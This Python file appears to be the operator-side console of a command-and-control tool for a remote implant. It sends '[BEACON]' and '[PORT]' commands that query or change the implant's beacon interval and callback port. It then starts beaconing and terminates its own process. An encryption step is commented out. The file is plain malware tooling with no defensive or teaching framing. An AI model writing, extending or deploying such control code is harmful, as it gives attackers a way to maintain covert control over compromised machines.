from printlib import *
from os import kill, getpid
from signal import SIGTERM
import tasker

def configure(conn):
    query(conn)
    ans = print_question_list("New Beacon Interval (sec)")
    send_data(conn, "[BEACON]{}".format(ans))

def change_port(conn):
    ans = print_question_list("Select Option","1 - Query Callback Port Config","2 - Set Callback Port")
    if ans == "1":
        send_data(conn, "[PORT]?")
        print_info("Current Callback Port:")
        recv_data(conn)
    elif ans == "2":
        ans = print_question("Enter new callback port")
        send_data(conn, "[PORT]{}".format(ans))

def query(conn):
    send_data(conn, "[BEACON]?")
    print_info("Current Setting (sec):")
    recv_data(conn)

def start_beaconing(conn):
    send_data(conn, "[BEACON]START")
    kill(getpid(), SIGTERM)

def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def recv_data(conn):
    data = ""
    while not data.endswith('[END]'):
        recv = conn.recv(128)
        recv_decoded = recv.decode('utf-8')
        data = data + recv_decoded
    print(data.rstrip("[END]"))